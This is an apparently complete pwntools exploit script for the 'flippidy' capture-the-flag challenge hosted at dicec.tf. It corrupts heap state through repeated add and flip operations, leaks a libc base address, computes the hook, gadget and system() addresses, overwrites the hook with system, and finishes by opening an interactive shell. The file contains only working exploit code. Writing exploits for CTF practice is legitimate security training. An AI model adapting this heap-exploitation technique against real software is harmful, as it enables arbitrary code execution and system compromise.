#!python2
from pwn import *
import sys
import os

remote_ip,port = 'dicec.tf',31904

binary = ['./flippidy']

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace = True

else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc.so.6"})

def init(size):
    sla("be: ",str(size))

def add(idx,data):
    sla(": ",'1')
    sla("Index: ",str(idx))
    sla("Content: ",data)

def flip():
    sla(": ",'2')

if __name__=="__main__":
    init(1)
    #for i in range(1):
    add(0,p64(0x404020))
    flip()
    add(0,(p64(0x00404040)+p64(0x404120)*3+p64(0x404040)))
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    leak = u64(io.recvline().strip()+"\x00\x00")-0x3ec760
    hook = leak + 0x3ed8e0
    gad = leak + 0x10a38c
    system = leak + 0x4f440
    log.info("leak : "+str(hex(leak)))
    add(0,p64(hook))
    add(0,p64(leak))
    payload = "/bin/sh\x00" + p64(system)
    add(0,payload)
    #gdb.attach(io)
    flip()
    #flip()
    #add(0,p64(0x4040d0))
    io.interactive()
